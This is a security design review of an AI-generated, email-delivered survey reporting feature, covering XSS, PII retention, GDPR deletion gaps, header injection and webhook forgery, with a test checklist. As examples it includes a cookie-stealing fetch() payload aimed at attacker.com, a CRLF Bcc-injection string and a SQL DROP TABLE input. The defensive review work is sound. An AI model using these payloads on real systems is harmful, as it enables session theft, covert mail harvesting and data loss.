# Security Review: Intelligence Briefings (Scheduled Reports)

**Reviewer:** Elena Vasquez — Email Security & Privacy Specialist  
**Review Date:** 2026-06-29  
**Feature:** Intelligence Briefings — Scheduled Report Generation & Email Delivery  
**Documents Reviewed:** ARCHITECTURE.md, DESIGN.md, ROADMAP.md, TEAM.md, plus referenced schema and endpoint definitions  
**Status:** NOT APPROVED FOR LAUNCH — Critical findings must be resolved before production delivery

---

## 1. Executive Summary

The Intelligence Briefings feature introduces a persistent AI-generated report pipeline that collects verbatim survey respondent quotes, stores them in long-lived database artifacts, and distributes them via email to a recipient list that is not constrained to organizational membership. Across the five design documents reviewed, I identified four Critical-severity findings — PII retention in unscrubbable artifacts, unconstrained external recipient addresses, LLM output rendered into email without HTML sanitization, and GDPR deletion gaps — that individually would constitute a data breach or compliance violation and collectively represent a significant trust risk for Xperiq as a platform. The email delivery layer additionally lacks SendGrid webhook signature verification, making delivery state (bounces, unsubscribes) trivially spoofable. No architectural decision in this feature can be shipped as designed until the Critical findings are addressed; the High and Medium findings should be resolved in the same sprint to avoid a second security pass before launch.

---

## 2. Vulnerability Findings

### Critical

---

#### SEC-001 — LLM Output Rendered into Email HTML Without Verified Sanitization

**Description:** The `generate_narrative` node in the CrystalOS pipeline produces a `narrative` text field that is passed to the `render_html` Jinja2 template and stored in `report_artifacts.html_content TEXT`. The post-generation guard in `generate_narrative` checks that numeric values in the narrative match `metric_payload`, but no analogous guard strips or escapes HTML. Survey respondents can freely enter arbitrary text in open-text questions. If a respondent submits `<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">` as a verbatim response, and Crystal quotes or paraphrases this text into `narrative`, that payload propagates through `html_content` into every email delivery and into the no-auth web view at `/reports/:id/view/:runId`.

**Attack Vector:** A competitor or malicious respondent submits crafted HTML/JavaScript in a survey open-text field. Crystal's LLM paraphrases the response, retaining the tag structure. The payload lands in `html_content`, is emailed to all recipients, and executes in any email client that renders HTML (webmail clients running in a browser context). The web view route — which requires no authentication — executes the payload for any user who opens the share link.

**Exact Fix:**
- In the `render_html` Jinja2 template, confirm `autoescape=True` is set globally on the `Environment` object, not just on individual template files. `Environment(autoescape=True)` must be the construction site default.
- Add a post-LLM sanitization step in the `generate_narrative` node using `bleach.clean()` (Python) or an equivalent allowlist-based sanitizer applied to the `narrative` string before it is passed to the template renderer. The allowlist should permit only: `b`, `i`, `em`, `strong`, `br`, `p`, `ul`, `ol`, `li`.
- Apply the same sanitizer to the `highlights` JSONB field values (verbatim quotes) before they are interpolated into HTML.
- Add an integration test that passes `<script>alert(1)</script>` as a narrative input and asserts the output `html_content` contains neither `<script>` nor `onerror`.

**Files Affected:** `crystalos/` generate_narrative node, `render_html` Jinja2 template, `report_artifacts` table write path.

---

#### SEC-002 — Verbatim Respondent Quotes Stored in Unencrypted, Unscrubbable Artifacts

**Description:** The `report_artifacts` table stores `highlights JSONB` containing verbatim survey responses with `respondent_id` attribution, and `html_content TEXT` containing the full rendered HTML of the report including those quotes. `html_content` is stored as plaintext in Postgres with no column-level encryption. The 90-day TTL (`expires_at TIMESTAMPTZ NOT NULL DEFAULT (now() + interval '90 days')`) handles artifact expiry only for the happy path. There is no process to scrub artifacts when a respondent exercises GDPR Article 17 (right to erasure) or CCPA deletion rights. The respondent's verbatim quote and `respondent_id` may persist in `html_content` for up to 90 days after their response row is deleted.

**Attack Vector:** A respondent submits a GDPR deletion request. The backend deletes their response row. Their verbatim quote — "I was diagnosed with [condition] when I used this service" — remains embedded inside the HTML blob of every artifact generated during their participation window, potentially across dozens of report runs. The artifact expiry process does not scan or redact `html_content`. A database administrator, an engineer with Postgres access, or anyone who received an already-delivered email retains access to this PII indefinitely beyond the deletion date.

**Exact Fix:**
- Introduce a `report_artifact_quotes` junction table that stores `(artifact_id UUID, respondent_id UUID, quote_index INT)` separately from the HTML blob. This normalizes the PII so it can be located and scrubbed without parsing HTML.
- Add a `scrub_artifacts` job triggered on respondent deletion: nullify `highlights` entries matching the deleted `respondent_id` and re-render or tombstone `html_content` with a redaction placeholder for affected artifacts.
- For column-level encryption of `html_content` and `highlights`, evaluate `pgcrypto` symmetric encryption or application-layer encryption (encrypt before INSERT, decrypt after SELECT) using an envelope key stored in a KMS (not in the Postgres instance itself).
- Add a `respondent_id` to `artifact_id` index to make scrubbing queries O(log n) rather than a full table scan.

**Files Affected:** `report_artifacts` schema, respondent deletion handler, `supabase/` migrations.

---

#### SEC-003 — Unconstrained External Recipient Addresses Enable Data Exfiltration

**Description:** `report_recipients.email TEXT NOT NULL` stores raw email addresses. The `POST /api/reports/:id/recipients` endpoint accepts any email address as a recipient. The architecture documents no validation that the recipient's email domain belongs to the organization, that the recipient has a Clerk account within the org, or that the recipient has explicitly opted in. An Org Admin can add `competitor-analyst@rival.com` as a recipient of a weekly NPS intelligence briefing containing verbatim customer quotes, Crystal recommendations, and aggregated experience metrics.

**Attack Vector:** A rogue insider at Org A (e.g., a soon-to-depart employee with Org Admin privileges) adds five external email addresses belonging to a competitor before their last day. All subsequent scheduled report deliveries — containing current NPS scores, verbatim dissatisfied customer quotes, and Crystal's strategic recommendations — are forwarded to the competitor indefinitely. The `report_recipients` table has no audit trail for who added which recipient or when.

**Exact Fix:**
- Add server-side validation in `POST /api/reports/:id/recipients`: the email domain must match one of the org's verified domains (stored in an `org_domains` table or fetched from Clerk's organization metadata).
- If cross-domain recipients are a legitimate use case (e.g., exec stakeholders at a partner), introduce an explicit `external_recipient_approval` workflow requiring a second Org Admin to confirm, with the approval logged in an audit table.
- Add `added_by UUID REFERENCES users(id)` and `added_at TIMESTAMPTZ DEFAULT now()` columns to `report_recipients` for audit trail.
- Emit an audit log event on every recipient addition and removal, visible to Org Admins in the activity log.

**Files Affected:** `POST /api/reports/:id/recipients` handler, `report_recipients` schema, `supabase/` migrations.

---

#### SEC-004 — GDPR / CCPA Deletion Gap in Already-Generated Artifacts

**Description:** This finding is architecturally distinct from SEC-002 (encryption at rest) and specifically concerns the deletion workflow. When a respondent's data is deleted from the primary responses table, there is no mechanism in the described architecture to identify which `report_artifacts` rows contain that respondent's data and scrub or expire them. The `highlights` JSONB field stores `respondent_id` values, which provides a hook, but no deletion handler reads this field. Email delivery of an already-generated artifact is also not addressed: an artifact that was queued for delivery but not yet sent may deliver PII after the deletion request was honored in the primary store.

**Attack Vector:** A respondent files a GDPR erasure request on Day 1. The backend deletes their response row. A scheduled report that ran on Day 0 (before deletion) is still in the delivery queue. The email delivers on Day 2 with the respondent's verbatim quote. Under GDPR Article 17, this is a violation — the controller honored the deletion in the source system but the derived artifact was not scrubbed.

**Exact Fix:**
- The respondent deletion handler must atomically: (1) delete the response row, (2) query `report_artifact_quotes` (see SEC-002) for all `artifact_id` values linked to this `respondent_id`, (3) for each artifact, null out the relevant `highlights` entry and either re-render `html_content` or mark the artifact as `redacted = true` to suppress delivery.
- Add a delivery gate: before the `deliver` node sends any artifact, check `artifact.redacted`. If true, skip delivery or send a redacted version.
- Store GDPR deletion audit records: `respondent_id`, `deleted_at`, `artifacts_scrubbed[]`, `artifacts_suppressed[]`.

**Files Affected:** Respondent deletion handler, `deliver` node in CrystalOS, `report_artifacts` schema.

---

### High

---

#### SEC-005 — Email Header Injection via Unsanitized User-Supplied Strings

**Description:** `scheduled_reports.name`, the org name, and survey name are user-supplied strings. The `generate_narrative` node pre-computes the email Subject header using these values. `template_overrides JSONB` on `scheduled_reports` may also contribute header text. If any of these values are interpolated into the `Subject:` header or any `X-` header without CRLF stripping, classic email header injection is possible.

**Attack Vector:** An attacker sets their org name (or report name) to `"Quarterly NPS\r\nBcc: harvester@attacker.com\r\nX-Injected: true"`. The SendGrid API call constructs the Subject header by string interpolation. Depending on how SendGrid's client library handles the value, the injected headers may survive, adding a blind BCC to every delivery of that report — silently forwarding every recipient's copy to the attacker.

**Exact Fix:**
- Strip `\r`, `\n`, and `\r\n` (CRLF) from all user-supplied strings before they are used in email headers. Apply this as a utility function (`sanitize_header_value(s: str) -> str`) called at the point of SendGrid API call construction, not at input time.
- Additionally, enforce a maximum length of 200 characters on `scheduled_reports.name` and validate that `template_overrides` header values contain no control characters.
- Add a test: construct a report with name `"NPS\r\nBcc: evil@x.com"` and assert the outbound SendGrid payload's Subject field equals `"NPS Bcc: evil@x.com"` with no CRLF.

**Files Affected:** `deliver` node, SendGrid client wrapper, `scheduled_reports` schema validation.

---

#### SEC-006 — SendGrid Webhook Missing Signature Verification

**Description:** TEAM.md assigns Simone ownership of "event webhooks (delivered, opened, bounced, unsubscribes)." ROADMAP.md Phase 2 introduces `SENDGRID_API_KEY`, `SENDGRID_FROM_EMAIL`, and `SENDGRID_FROM_NAME` but does not mention a `SENDGRID_WEBHOOK_SIGNING_SECRET`. SendGrid provides ECDSA-signed webhook payloads; without verifying the `X-Twilio-Email-Event-Webhook-Signature` header, the webhook endpoint will accept forged events from any caller.

**Attack Vector:** An attacker discovers the webhook endpoint URL (which is typically `POST /api/webhooks/sendgrid` and not secret). They send a POST body with `"event": "unsubscribe", "email": "ceo@customer.com"` for every active recipient. The platform marks them as unsubscribed and stops delivering reports. This is a targeted denial-of-delivery attack against any recipient whose email address the attacker knows.

**Exact Fix:**
- Add `SENDGRID_WEBHOOK_SIGNING_SECRET` to `backend/.env.example`, `docs/ENV_VARS.md`, and the SendGrid account webhook settings.
- In the webhook handler, verify the signature per SendGrid's ECDSA verification spec before processing any event. Reject with HTTP 403 on verification failure.
- Add the env var to ROADMAP.md Phase 2 infrastructure requirements.

**Files Affected:** SendGrid webhook handler (`backend/`), `backend/.env.example`, `docs/ENV_VARS.md`, ROADMAP.md.

---

#### SEC-007 — Unsigned Artifact Preview Endpoint Without Org Isolation Defense-in-Depth

**Description:** `GET /api/reports/:id/runs/:runId/preview` returns `html` plus the full `metricPayload` for "debugging." The endpoint relies on Clerk middleware for authentication and on a backend `org_id` check for isolation. UUIDs are v4 (random), which makes brute-force infeasible but does not protect against: (a) a bug in the `org_id` check allowing cross-org access, (b) a future code path that calls this endpoint without the Clerk middleware, or (c) the `metricPayload` being exposed if the endpoint is ever opened for external use. PDF artifacts in GCS/S3 are referenced via `pdf_storage_key` with no presigned URL mentioned.

**Attack Vector:** A developer adds a new route handler for the share link feature and forgets to thread the Clerk middleware. The preview endpoint is now publicly accessible. UUID v4 has 122 bits of entropy — infeasible to brute-force individually — but a persistent attacker who has obtained one valid `runId` via an IDOR in another endpoint can access the full metric payload and HTML of that org's report.

**Exact Fix:**
- Remove `metricPayload` from the preview response entirely. Return only `html`. Add a separate admin-gated endpoint `GET /api/admin/reports/:id/runs/:runId/debug` for debugging access to metric payloads.
- Generate GCS/S3 presigned URLs server-side (15-minute expiry) for `pdf_storage_key` rather than returning the storage key. Never expose raw storage keys to clients.
- Add an integration test that authenticates as Org B and attempts to fetch a `runId` belonging to Org A; assert HTTP 403.

**Files Affected:** `GET /api/reports/:id/runs/:runId/preview` handler, GCS/S3 artifact retrieval, `report_artifacts` read path.

---

#### SEC-008 — 30-Day No-Auth Share Link Exposes PII to Anyone with the URL

**Description:** DESIGN.md describes a "Share" button that copies a link to `/reports/:id/view/:runId` "valid for 30 days, no auth required for view-only." This link exposes aggregated NPS metrics, verbatim customer quotes attributed to `respondent_id`, and Crystal's strategic recommendations to anyone who receives or finds the URL. There is no revocation mechanism. The link is generated client-side (copied from a button), meaning there is no server-side record of who generated it or when.

**Attack Vector:** A manager shares the link in a Slack message. The Slack workspace is compromised six months later by an attacker reviewing message history. The link has since expired (30 days), but the manager re-generates one the following month in another Slack post. The attacker collects a library of report snapshots over time, each containing verbatim customer sentiment data, without any authentication.

**Exact Fix:**
- Require share links to be generated server-side: `POST /api/reports/:id/share` creates a `report_share_tokens` row with `token UUID`, `created_by`, `created_at`, `expires_at (now() + 30 days)`, `revoked_at`.
- Add a `DELETE /api/reports/:id/share/:token` revocation endpoint.
- Notify the report creator (in-app notification, not email) when their share link is first accessed.
- Consider whether 30 days is appropriate given the sensitivity of the data. For reports containing verbatim quotes, a 7-day default with creator-configurable extension is more defensible.

**Files Affected:** DESIGN.md share link flow, new `report_share_tokens` table, `supabase/` migrations, `/reports/:id/view/:runId` route handler.

---

### Medium

---

#### SEC-009 — Permanent Unsubscribe Tokens With No Creator Visibility

**Description:** `report_recipients.unsubscribe_token UUID NOT NULL DEFAULT gen_random_uuid()` is documented as "never expires." The unsubscribe endpoint `GET /api/reports/unsubscribe/:token` is explicitly unauthenticated. If a recipient's email is forwarded, the forwardee can click the unsubscribe link and silently remove the original recipient from the report. The report creator receives no notification when this occurs.

**Exact Fix:**
- Add `unsubscribed_at TIMESTAMPTZ` and `unsubscribed_via TEXT` (values: `"link"`, `"sendgrid_event"`, `"admin"`) to `report_recipients`.
- Notify the report creator in-app when any recipient unsubscribes, showing the recipient email and the unsubscribe method.
- Token non-expiry is acceptable for unsubscribe links (per CAN-SPAM/GDPR requirements that unsubscribe must always be honored), but add a rate-limit of 10 requests per token per hour to prevent enumeration.
- Do not rotate the token on use — this would break the RFC 8058 one-click unsubscribe pattern — but log each use with timestamp and client IP for audit purposes.

**Files Affected:** `report_recipients` schema, `GET /api/reports/unsubscribe/:token` handler, creator notification system.

---

#### SEC-010 — `metricPayload` Exposed in Preview Response

**Description:** `GET /api/reports/:id/runs/:runId/preview` returns `metricPayload: ReportMetricPayload` labeled as a debugging aid. Full aggregated metric data (NPS scores, segment breakdowns, trend data) is returned alongside the HTML preview. This data should not be co-located with a preview endpoint that may be broadened in scope — for example, used by share link flows — in the future.

**Exact Fix:** Remove `metricPayload` from the standard preview response immediately. Move it to a dedicated admin/debug endpoint with explicit admin-role gating. This is a one-line deletion from the preview response serializer.

**Files Affected:** `GET /api/reports/:id/runs/:runId/preview` response serializer.

---

### Low

---

#### SEC-011 — No `List-Unsubscribe-Post` Header for RFC 8058 One-Click Unsubscribe

**Description:** Modern email clients (Gmail, Apple Mail) display a native "Unsubscribe" button when `List-Unsubscribe` and `List-Unsubscribe-Post` headers are present per RFC 8058. Without these headers, the only unsubscribe path is through the link in the email body, which is more prone to being missed or misused.

**Exact Fix:** Add `List-Unsubscribe: <https://app.xperiq.com/api/reports/unsubscribe/{token}>` and `List-Unsubscribe-Post: List-Unsubscribe=One-Click` to every outbound report email via the SendGrid API's `headers` map.

**Files Affected:** `deliver` node, SendGrid client wrapper.

---

## 3. Security Test Checklist

The following tests must pass before the feature is approved for production launch. All tests should be automated in CI.

**Email Delivery Security**

1. Construct a report with `scheduled_reports.name = "NPS Report\r\nBcc: evil@attacker.com"` and assert the outbound SendGrid `subject` field contains no CRLF sequences and no `Bcc:` injection.
2. Send a POST to the SendGrid webhook endpoint without a valid `X-Twilio-Email-Event-Webhook-Signature` header and assert HTTP 403.
3. Send a POST to the SendGrid webhook endpoint with a correctly signed "unsubscribe" event and assert the matching `report_recipients` row is marked unsubscribed and the report creator receives an in-app notification.
4. Send a crafted "bounce" event for a non-existent recipient email and assert the webhook handler returns HTTP 200 with no state change (idempotent, no crash).
5. Assert that every outbound email payload includes `List-Unsubscribe` and `List-Unsubscribe-Post` headers.

**Artifact Access Control**

6. Authenticate as a user in Org B and issue `GET /api/reports/:id/runs/:runId/preview` where `runId` belongs to Org A; assert HTTP 403.
7. Assert that `GET /api/reports/:id/runs/:runId/preview` does not include `metricPayload` in the response body.
8. Assert that the preview response for a PDF-backed artifact returns a presigned URL with an expiry of 15 minutes or less, not a raw `pdf_storage_key`.
9. Generate a share token for a report, wait for it to expire, and assert `GET /reports/:id/view/:runId?token=<expired>` returns HTTP 410 Gone.
10. Revoke a share token via `DELETE /api/reports/:id/share/:token` and assert the share link returns HTTP 403.

**Recipient Management**

11. Attempt to add an external email (domain not matching the org's verified domains) via `POST /api/reports/:id/recipients` and assert HTTP 422 with an appropriate error message.
12. Add a recipient and assert the `report_recipients` row includes `added_by` and `added_at` values.
13. Add a recipient as Org Admin A, authenticate as Org Admin B (different org), and assert they cannot list or delete Org A's recipients.

**Injection Prevention**

14. Pass a narrative string containing `<script>alert(1)</script>` through the `render_html` template and assert the rendered `html_content` does not contain `<script` or `onerror`.
15. Pass `<img src=x onerror="fetch('https://x.com')">` as a verbatim quote value in `highlights` and assert the rendered HTML contains neither `onerror` nor an unescaped `<img` tag.
16. Pass `'; DROP TABLE report_artifacts; --` as a report name and assert no SQL error and no data loss (parameterized queries only — this should already pass but confirm).

**PII Handling and Deletion**

17. Generate a report artifact containing quotes attributed to `respondent_id = 'R-1234'`. Delete respondent R-1234. Assert that `report_artifacts.highlights` contains no entries with `respondent_id = 'R-1234'` after the deletion job runs.
18. Assert that any artifact with `redacted = true` is not delivered by the `deliver` node (mock the SendGrid client and assert it is not called for redacted artifacts).
19. Assert that `html_content` for a scrubbed artifact does not contain any string that was present in the original verbatim quote of the deleted respondent.

**Webhook and Token Security**

20. Issue 11 requests to `GET /api/reports/unsubscribe/:token` within one minute and assert the 11th request is rate-limited with HTTP 429.

---

## 4. Privacy and Compliance

### GDPR / CCPA Deletion Gaps

The most material compliance gap is the absence of a derived-data scrubbing process. GDPR Article 17 and CCPA Section 1798.105 require that personal data be deleted not only from the primary record but from any derived or processed copies where technically feasible. Report artifacts containing verbatim quotes attributed to a `respondent_id` are derived personal data. The platform must implement the scrubbing workflow described in SEC-002 and SEC-004 before processing any data from EU or California residents.

Additionally, the 90-day artifact TTL is a retention policy, not a deletion policy. TTL-based expiry without a GDPR deletion trigger does not satisfy the erasure obligation. The two mechanisms must be decoupled: TTL expiry removes artifacts that have aged out on a schedule; GDPR deletion removes artifacts that contain a specific respondent's data immediately upon verified request.

### Retention Policy Recommendations

- Reduce default artifact TTL from 90 days to 30 days for reports containing verbatim quotes. Allow org-level extension up to 90 days with explicit acknowledgment that the org assumes GDPR controller obligations for the extended retention period.
- Do not store full `html_content` for artifacts older than the TTL. Consider storing only the `highlights` JSONB (structured, scrubbable) and regenerating HTML on demand for the web view, rather than persisting the full HTML blob indefinitely.
- Implement artifact access logs: every `GET /api/reports/:id/runs/:runId/preview` and share link access should be recorded with user identity and timestamp, retained for 12 months, for incident response.

### PII Minimization Recommendations

- The `highlights` JSONB field currently stores `respondent_id`. Evaluate whether `respondent_id` is necessary in the rendered report or whether it can be replaced with a stable display label (`"Respondent #4821"`) computed at render time without storing the actual ID in the artifact.
- Suppress verbatim quotes for any cohort with fewer than 5 respondents to prevent re-identification of individuals in small response pools.
- Treat `report_artifacts.html_content` as a PII-containing field in all data classification documentation, data processing agreements (DPAs), and any SOC 2 / ISO 27001 controls inventory.

---

## 5. Recommended Architecture Changes

The following five architectural decisions would resolve the most critical findings and establish a defensible security posture for the feature at launch.

**1. Normalize PII Out of the HTML Blob (resolves SEC-001, SEC-002, SEC-004)**

Do not store verbatim quotes inside `html_content TEXT`. Instead, store structured quote data in a separate `report_artifact_quotes` table (`artifact_id`, `respondent_id`, `quote_text`, `display_label`). The HTML template interpolates quotes by joining on this table at render time. On respondent deletion, scrub rows from `report_artifact_quotes` and invalidate the cached `html_content`. This makes GDPR scrubbing a targeted DELETE + re-render rather than an HTML blob parse-and-patch operation, and it makes column-level encryption feasible (encrypt `quote_text` only, not the entire HTML).

**2. HTML Sanitization Pipeline as a Named Stage in CrystalOS (resolves SEC-001)**

Introduce a dedicated `sanitize_output` stage in the CrystalOS report pipeline that runs after `generate_narrative` and before `render_html`. This stage applies `bleach.clean()` with an explicit allowlist, strips CRLF from all string fields destined for email headers, and logs a warning if any input contained tags that were stripped. Making this a named pipeline stage — rather than an inline call in the template — ensures it cannot be bypassed by future pipeline modifications and can be independently tested and audited.

**3. Recipient Domain Allowlist with Opt-In External Recipients (resolves SEC-003)**

The `POST /api/reports/:id/recipients` endpoint must validate that the recipient's email domain is in the org's verified domain list by default. If the org needs to add an external recipient (a legitimate use case for executive stakeholders), this must go through an explicit approval flow: a second Org Admin confirms the addition, the addition is logged to the audit trail, and the external recipient receives a confirmation email with an opt-in link before they are added to any delivery list. This pattern follows CAN-SPAM and CASL opt-in requirements and limits the blast radius of a rogue insider.

**4. Server-Side Share Token Registry with Revocation (resolves SEC-008)**

Replace the client-side "copy link" share button with a server-side `POST /api/reports/:id/share` endpoint that creates a `report_share_tokens` row. The token table stores `created_by`, `expires_at`, `revoked_at`, and `first_accessed_at`. The web view route validates the token against this table on every request, honoring `revoked_at` and `expires_at`. This adds revocation capability (a requirement for any access control mechanism that grants access to PII), an audit trail, and a first-access notification hook.

**5. SendGrid Webhook Signature Verification as a Middleware (resolves SEC-006)**

Implement a `verify_sendgrid_signature` Express middleware that extracts the `X-Twilio-Email-Event-Webhook-Signature` and `X-Twilio-Email-Event-Webhook-Timestamp` headers, verifies the ECDSA signature against the payload using the `SENDGRID_WEBHOOK_SIGNING_SECRET`, and rejects with HTTP 403 on failure. Apply this middleware to the webhook route before any event processing. Add `SENDGRID_WEBHOOK_SIGNING_SECRET` to `backend/.env.example` and `docs/ENV_VARS.md` as part of the Phase 2 infrastructure rollout. Without this control, delivery state — bounces, unsubscribes, spam complaints — can be arbitrarily manipulated by any caller who knows the webhook URL.

---

*This review was conducted against design documents only. A code-level review of the implementation is required before final sign-off. The Critical findings (SEC-001 through SEC-004) must be resolved and verified in code before any production traffic is routed to this feature.*
